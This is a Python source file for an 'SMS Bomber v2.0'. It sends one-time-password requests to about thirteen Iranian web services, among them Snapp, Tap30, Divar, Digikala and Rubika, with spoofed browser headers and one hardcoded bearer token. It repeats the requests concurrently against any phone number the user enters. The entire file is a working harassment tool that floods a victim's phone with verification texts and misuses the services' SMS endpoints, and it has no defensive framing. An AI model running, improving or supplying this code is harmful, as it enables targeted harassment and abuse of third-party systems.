# main.py (اصلاح شده)
import asyncio
import base64
import re
import time
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, List, Optional

import requests
from requests import Response

class Color:
    """Class for terminal colors"""
    RED = '\033[1;31m'
    GREEN = '\033[32;1m'
    YELLOW = '\033[1;33m'
    WHITE = '\033[1;37m'
    BLUE = '\033[1;34m'
    PURPLE = '\033[1;35m'
    CYAN = '\033[1;36m'
    RESET = '\033[0m'

class ServiceAPI:
    """Base class for all service APIs"""
    
    def __init__(self, timeout: int = 5):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
        })
    
    def normalize_phone(self, phone: str) -> str:
        """Normalize phone number to +98 format"""
        phone = re.sub(r"\s+", "", phone.strip())
        
        if re.match(r"^\+989[0-9]{9}$", phone):
            return phone
        elif re.match(r"^989[0-9]{9}$", phone):
            return f"+{phone}"
        elif re.match(r"^09[0-9]{9}$", phone):
            return f"+98{phone[1::]}"
        elif re.match(r"^9[0-9]{9}$", phone):
            return f"+98{phone}"
        else:
            raise ValueError("Invalid phone number format")
    
    def get_local_phone(self, phone: str) -> str:
        """Get phone in local format (09xxxxxxxx)"""
        normalized = self.normalize_phone(phone)
        return "0" + normalized.split("+98")[1]
    
    def print_success(self, service_name: str):
        """Print success message with colors"""
        print(f"{Color.GREEN}[+] {Color.YELLOW}{service_name}: {Color.WHITE}Code was sent{Color.RESET}")
    
    def print_error(self, service_name: str, error: str = ""):
        """Print error message with colors"""
        print(f"{Color.RED}[-] {Color.YELLOW}{service_name}: {Color.WHITE}Failed {error}{Color.RESET}")

class SnapAPI(ServiceAPI):
    """Snapp Taxi API"""
    
    def send_otp(self, phone: str) -> bool:
        try:
            headers = {
                "Host": "app.snapp.taxi",
                "content-length": "29",
                "x-app-name": "passenger-pwa",
                "x-app-version": "5.0.0",
                "app-version": "pwa",
                "content-type": "application/json",
                "accept": "*/*",
                "origin": "https://app.snapp.taxi",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://app.snapp.taxi/login/?redirect_to=%2F",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "fa-IR,fa;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6"
            }
            data = {"cellphone": phone}
            response = self.session.post(
                url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
                headers=headers,
                json=data,
                timeout=self.timeout
            )
            if "OK" in response.text:
                self.print_success("Snap")
                return True
        except Exception as e:
            self.print_error("Snap", str(e))
        return False

class Tap30API(ServiceAPI):
    """Tap30 (Tapsi) API"""
    
    def send_otp(self, phone: str) -> bool:
        try:
            headers = {
                "Host": "tap33.me",
                "Connection": "keep-alive",
                "Content-Length": "63",
                "content-type": "application/json",
                "Accept": "*/*",
                "Origin": "https://app.tapsi.cab",
                "Sec-Fetch-Site": "cross-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://app.tapsi.cab/",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "fa-IR,fa;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6"
            }
            data = {
                "credential": {
                    "phoneNumber": self.get_local_phone(phone),
                    "role": "PASSENGER"
                }
            }
            response = self.session.post(
                url="https://tap33.me/api/v2/user",
                headers=headers,
                json=data,
                timeout=self.timeout
            ).json()
            
            if response.get('result') == "OK":
                self.print_success("Tap30")
                return True
        except Exception as e:
            self.print_error("Tap30", str(e))
        return False

class DivarAPI(ServiceAPI):
    """Divar API"""
    
    def send_otp(self, phone: str) -> bool:
        try:
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://divar.ir',
                'referer': 'https://divar.ir/',
                'x-standard-divar-error': 'true'
            }
            data = {"phone": phone.split("+98")[1]}
            response = self.session.post(
                url="https://api.divar.ir/v5/auth/authenticate",
                headers=headers,
                json=data,
                timeout=self.timeout
            ).json()
            
            if response.get("authenticate_response") == "AUTHENTICATION_VERIFICATION_CODE_SENT":
                self.print_success("Divar")
                return True
        except Exception as e:
            self.print_error("Divar", str(e))
        return False

class TorobAPI(ServiceAPI):
    """Torob API"""
    
    def send_otp(self, phone: str) -> bool:
        try:
            headers = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'origin': 'https://torob.com',
                'referer': 'https://torob.com/'
            }
            local_phone = self.get_local_phone(phone)
            response = self.session.get(
                url=f"https://api.torob.com/a/phone/send-pin/?phone_number={local_phone}",
                headers=headers,
                timeout=self.timeout
            ).json()
            
            if response.get("message") == "pin code sent":
                self.print_success("Torob")
                return True
        except Exception as e:
            self.print_error("Torob", str(e))
        return False

class SnapFoodAPI(ServiceAPI):
    """SnapFood API"""
    
    def send_otp(self, phone: str) -> bool:
        try:
            url = 'https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa'
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjYxZTA5NjE5ZjVmZTNkNmRlOTMwYTQwY2I5NzdlMTBhYWY2Y2MxYWIzYTNhNjYxM2U2YWFmZGNkMzhhOTY0Mzg1NjZkMzIyMGQ3NDU4MTc2In0.eyJhdWQiOiJzbmFwcGZvb2RfcHdhIiwianRpIjoiNjFlMDk2MTlmNWZlM2Q2ZGU5MzBhNDBjYjk3N2UxMGFhZjZjYzFhYjNhM2E2NjEzZTZhYWZkY2QzOGE5NjQzODU2NmQzMjIwZDc0NTgxNzYiLCJpYXQiOjE2MzkzMTQ4NjMsIm5iZiI6MTYzOTMxNDg2MywiZXhwIjoxNjQxOTkzMzgzLCJzdWIiOiIiLCJzY29wZXMiOlsibW9iaWxlX3YyIiwibW9iaWxlX3YxIiwid2VidmlldyJdfQ.aRR7PRnrh-hfQEhkG2YnN_AJL3AjGsI2LmWwRufsvnD6enxPGJQXyZFn9MoH3OSBPmgXFMoHmCnbXvxoDA5jeRdmUvy4swLbKZf7mfv2Zg4CEQusIGgBHeqMmI31H2PIhCLPtShg0trGgzs-BUCArzMM6TV7s1P6GKMhSyXXVzxj8duJxdiNTVx5IeO8GAo8hpt6pojbp3q07xhECgK-8-3n8qevV9CRBtIwhkhqrcubgrQk6ot64ksiosVhHhvI-xVm1AW8hArI62VcEv-13AH92e9n30auYYKC961wRU6_FUFzauHqSXlhWBgZo6-uO9gwrLA7g0_91G8Eu98V4cKsVWZaRLRP1-tQE9otJduaSvEF4e88FdgW3A045Bd0I2F5Uri2WEemVyMV8CVT8Kdio6iBwGl8dLQS7SJhK7OYwTp_S7AZ9A4wJJbTuw-rU4_ykM2PlR5tNXwTNpcEdiLdglFsv9c0NOyClMIsAU7t7NcYcxdQ5twSDWPUmKK-k0xZMdeACUclkYYFNPqGSccGX0jpioyET0sMFrHQyeOvHxGPLfMeoTaXUA8LMognQ3oCWCsZHrcaQSJJ7H9WUIf4SYUvRwp-RE4JUxpOXvxgPjk0b1VUYF0dHjf1C-uQ3D7aYEAuzSW0JWyEFhurNpBaeQQhf35HH-SchuWCjafAr8rU0BCNkQJd4aresr7moHos1a_KoeQ2Y1HloPzsjOzRSpK97vApN0naRwK8k9RsoN65URZDbEzTc1b2dpTUR-VJw7lU0v5jT_PvZs7GUnpnv23UrYQIfMKISF9suy6ufb26DdIAr2pLOQ9NKqxb4QwDadFa1gPIpb_QU-8hL6N9533YTvTE8xJJjjwE6IQutNsZ1OdBdrj4APjNczDpb3PFaXtI0CbOKHYIUDsdyEIdF1o9RYrKYj-EP61SA0gzks-qYGJR1jnfQRkwkqoolu2lvDK0PxDXnM4Crd4kJRxVtrsD0P8P-jEvW6PYAmxXPtnsu5zxSMnllNNeOOAijcxG6IyPW-smsHV-6BAdk5w3FXAPe0ZcuDXb0gZseq2-GnqxmNDmRWyHc9TuGhAhWdxaP-aNm6MmoSVJ-G6fLsjXY3KLaRnIhmNfABxqcx0f03g6sBIh_1Rw965_WydlsMVU_K5-AIfsXPSxSmVnIPrN4VasUnp3XbJmnO9lm_rrpdNAM3VK20UPLCpxI7Ymxdl9wboAg8cdPlyBxIcClwtui0RC1FGZ-GpvVzWZDq_Mu6UEbU3bfi9Brr5CJ-0aa8McOK8TJBHCqfLHYOOqAruaLHhNR0fjw-bIzHLKtxGhwkkGp7n_28HtbiZVKqr48rBfbhzanCpSPYGDV4PM1_zrJDUJn4sRitw_Z78Lju3ssjuMae8zAEdHUCHGui_tYMABlPVaZhsB4s-KahT4aTOhzd7ejjoLE9WQUSuQBmMTGFZM0xH0Phyz1vSl7_5IpTHcCwTXUx3s8UvRB-Q3QQBa5O82gtZWTd56R7u0YrCJKVEnsf9a9lZz9Of6R4YdPhwByMvHFfbRLgNkuGzv75dZZf24KmbPTZN4sVCZgxD7oO0sTgh2hEYMSmdHnXvCySXZk_1G52yP8S7IwnEXRq_Hu1aje2dz0FRWYFR8nnmFuRyYSfj1rSy1Vut4ktNUsstlAYn8QmsvNqyn402aikpuG6s0ApOGMuLChv_BDd_tbsLu11-qLv3r5Exza9XJMq4aOFegpPJ5vH75entTpxPa16gmJ80lhlvKux0vnZI-mEDZ8zEI5uXi26zv4taUqLNw5nXQZbi8sxh90nYF1fNAQ-ERHQmoUeqAwL9AuZobvR7pRMmmjZMPeeDPPFrNDyCHYFO_Iu5kClQM_7jzmsLkOvCD68DkwhwftkNvTiA-dDqkkNpY8OB0GI4ynhrAqHN4Y378qbks7q4ifUU1NsSI5xdkHC4fseKMJTnnCYdyfhH14_X46zuAvSIL4DX262VTb6dAIN5KoHkjacc77Z4V7HsncWBysaXqK5yUIkL3JB5AiZlp8nV0_hCjNfA3QsfGQVoMYYeoTIutKF9Hr9r1efOXmTU0URZ-C6LYgzcntKlryroLwVg5jP3s2jQyCTIvs4CitUAyJEC3VyeW_VlSA02uMqxB-pjkipGEKe3KO1diCU7afe0xkd5C4K1NG-kLAbRAhCCtLRVJVSP0a_t84F737B9lub6bs5QcCvxARlfogXerUg9MjMU9qCWLzN9x2MukbsijxzmsGFcw-OBecMETDwoyB_0HrxP95QCwxw_X4rcW60HL45xbv9iC-gsn1qd-FKzO-XSYU0VWprr_z12bl9QOnpMc6OYf74IeJ27zl1nWR_gLo-Wg-WeFDyWcpNjmiHZkHYiDa1c3RgFv2t4ezYP0tsQEzLy-Yx0yB7WI5Z2kd_cSuaX73U9PW7rOCGnCD9cfyxZ27VyiHx8YMKKch6lyNmwPGfMhYqgMMo4NLmKy44taXRKPV20DhIsuNdMPcPUofrrrTsKarxurCX8EwRev4Ox-GcP-ocFtjKq_jkGRnqh4QQrJJh3Unpxm3sHcWhIWkNIcyChdjwnHPqKLb49UbVyJKxkt26E-cuO7_oC7PbMe8YjKFrmr2_igqr9i-YioVy1MdI5TL9sZhS8bMwG2rMozBYqWT9czRIKwabP9dUKpEn-d1nLbdrEeSzXOLYtXutiO57lGpxTDgf3ELp1zIEvTW7SEJBQ',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://snappfood.ir',
                'referer': 'https://snappfood.ir/'
            }
            data = {"cellphone": self.get_local_phone(phone)}
            response = self.session.post(
                url=url,
                headers=headers,
                data=data,
                timeout=self.timeout
            ).json()
            
            if response.get('status') is True:
                self.print_success("SnapFood")
                return True
        except Exception as e:
            self.print_error("SnapFood", str(e))
        return False

class AlibabaAPI(ServiceAPI):
    """Alibaba API"""
    
    def send_otp(self, phone: str) -> bool:
        try:
            headers = {
                "Host": "ws.alibaba.ir",
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "ab-channel": "WEB,PRODUCTION,CSR,WWW.ALIBABA.IR",
                "ab-alohomora": "MTMxOTIzNTI1MjU2NS4yNTEy",
                "Content-Type": "application/json;charset=utf-8",
                "Content-Length": "29",
                "Origin": "https://www.alibaba.ir",
                "Connection": "keep-alive",
                "Referer": "https://www.alibaba.ir/hotel"
            }
            data = {"phoneNumber": self.get_local_phone(phone)}
            response = self.session.post(
                url='https://ws.alibaba.ir/api/v3/account/mobile/otp',
                headers=headers,
                json=data,
                timeout=self.timeout
            ).json()
            
            if response.get("result", {}).get("success") is True:
                self.print_success("Alibaba")
                return True
        except Exception as e:
            self.print_error("Alibaba", str(e))
        return False

class DigikalaAPI(ServiceAPI):
    """Digikala API"""
    
    def send_otp(self, phone: str) -> bool:
        try:
            headers = {
                "Accept": "application/json",
                "Content-Type": "application/json"
            }
            data = {
                "backUrl": "/",
                "username": self.get_local_phone(phone),
                "otp_call": False
            }
            response = self.session.post(
                url="https://api.digikala.com/v1/user/authenticate/",
                headers=headers,
                json=data,
                timeout=self.timeout
            )
            
            if response.status_code == 200:
                self.print_success("Digikala")
                return True
        except Exception as e:
            self.print_error("Digikala", str(e))
        return False

class NamavaAPI(ServiceAPI):
    """Namava API"""
    
    def send_otp(self, phone: str) -> bool:
        try:
            headers = {
                "Accept": "application/json",
                "Content-Type": "application/json"
            }
            data = {"UserName": phone}
            response = self.session.post(
                url="https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
                headers=headers,
                json=data,
                timeout=self.timeout
            )
            
            if response.status_code == 200:
                self.print_success("Namava")
                return True
        except Exception as e:
            self.print_error("Namava", str(e))
        return False

class TelewebionAPI(ServiceAPI):
    """Telewebion API"""
    
    def send_otp(self, phone: str) -> bool:
        try:
            headers = {
                "Content-Type": "application/x-www-form-urlencoded"
            }
            data = {
                "code": "98",
                "phone": phone.split("+98")[1],
                "smsStatus": "default"
            }
            response = self.session.post(
                url="https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one",
                headers=headers,
                data=data,
                timeout=self.timeout
            )
            
            if response.status_code == 200:
                self.print_success("Telewebion")
                return True
        except Exception as e:
            self.print_error("Telewebion", str(e))
        return False

class EchargeAPI(ServiceAPI):
    """Echarge API"""
    
    def send_otp(self, phone: str) -> bool:
        try:
            headers = {
                "Content-Type": "application/json"
            }
            data = {"phoneNumber": self.get_local_phone(phone)}
            response = self.session.post(
                url="https://www.echarge.ir/m/login?length=19",
                headers=headers,
                json=data,
                timeout=self.timeout
            )
            
            if response.status_code == 200:
                self.print_success("Echarge")
                return True
        except Exception as e:
            self.print_error("Echarge", str(e))
        return False

class ShadAPI(ServiceAPI):
    """Shad Messenger API"""
    
    def send_otp(self, phone: str) -> bool:
        try:
            headers = {
                "Content-Type": "application/json"
            }
            data = {"phone": self.get_local_phone(phone)}
            response = self.session.post(
                url="https://shadmessenger12.iranlms.ir/",
                headers=headers,
                json=data,
                timeout=self.timeout
            )
            
            if response.status_code == 200:
                self.print_success("Shad")
                return True
        except Exception as e:
            self.print_error("Shad", str(e))
        return False

class RubikaAPI(ServiceAPI):
    """Rubika API"""
    
    def send_otp(self, phone: str) -> bool:
        try:
            headers = {
                "Content-Type": "application/json"
            }
            data = {"phone": phone}
            response = self.session.post(
                url="https://messengerg2c4.iranlms.ir/",
                headers=headers,
                json=data,
                timeout=self.timeout
            )
            
            if response.status_code == 200:
                self.print_success("Rubika")
                return True
        except Exception as e:
            self.print_error("Rubika", str(e))
        return False

class EmtiazAPI(ServiceAPI):
    """Emtiaz API"""
    
    def send_otp(self, phone: str) -> bool:
        try:
            headers = {
                "Content-Type": "application/json"
            }
            data = {"phone": phone}
            response = self.session.post(
                url="https://web.emtiyaz.app/json/login",
                headers=headers,
                json=data,
                timeout=self.timeout
            )
            
            if response.status_code == 200:
                self.print_success("Emtiaz")
                return True
        except Exception as e:
            self.print_error("Emtiaz", str(e))
        return False

class SMSBomber:
    """Main class for SMS Bomber"""
    
    def __init__(self, max_workers: int = 10):
        self.max_workers = max_workers
        self.services = [
            SnapAPI(),
            Tap30API(),
            DivarAPI(),
            TorobAPI(),
            SnapFoodAPI(),
            AlibabaAPI(),
            DigikalaAPI(),
            NamavaAPI(),
            TelewebionAPI(),
            EchargeAPI(),
            ShadAPI(),
            RubikaAPI(),
            EmtiazAPI()
        ]
    
    async def send_to_service(self, service: ServiceAPI, phone: str, delay: float = 0):
        """Send OTP to a specific service"""
        if delay > 0:
            await asyncio.sleep(delay)
        
        loop = asyncio.get_event_loop()
        with ThreadPoolExecutor() as pool:
            await loop.run_in_executor(pool, service.send_otp, phone)
    
    async def bomb(self, phone: str, delay: float = 0.1, count: int = 1):
        """Send OTP to all services"""
        phone = self.services[0].normalize_phone(phone)
        print(f"{Color.CYAN}[*] Starting SMS bombing to {Color.WHITE}{phone}{Color.CYAN}...{Color.RESET}")
        
        tasks = []
        for _ in range(count):
            for service in self.services:
                tasks.append(self.send_to_service(service, phone, delay))
        
        await asyncio.gather(*tasks)
        print(f"{Color.GREEN}[+] SMS bombing completed!{Color.RESET}")

def main():
    bomber = SMSBomber()
    
    print(f"""
{Color.CYAN}
╔════════════════════════════════════════╗
║         🚀 SMS Bomber v2.0 🚀          ║
║                                        ║
║  Send verification codes to any phone  ║
║     number from multiple services      ║
╚════════════════════════════════════════╝
{Color.RESET}
""")
    
    while True:
        try:
            phone = input(f"{Color.GREEN}[?] {Color.YELLOW}Enter phone number (+98): {Color.WHITE}")
            try:
                phone = bomber.services[0].normalize_phone(phone)
                break
            except ValueError:
                print(f"{Color.RED}[-] Invalid phone number format! Please try again.{Color.RESET}")
        except KeyboardInterrupt:
            print(f"\n{Color.RED}[!] Exiting...{Color.RESET}")
            return
    
    try:
        delay = float(input(f"{Color.GREEN}[?] {Color.YELLOW}Delay between requests (seconds, default=0.1): {Color.WHITE}"))
    except ValueError:
        delay = 0.1
        print(f"{Color.YELLOW}[!] Using default delay: 0.1 seconds{Color.RESET}")
    
    try:
        count = int(input(f"{Color.GREEN}[?] {Color.YELLOW}How many times to send (default=1): {Color.WHITE}"))
    except ValueError:
        count = 1
        print(f"{Color.YELLOW}[!] Using default count: 1{Color.RESET}")
    
    asyncio.run(bomber.bomb(phone, delay, count))

if __name__ == "__main__":
    main()
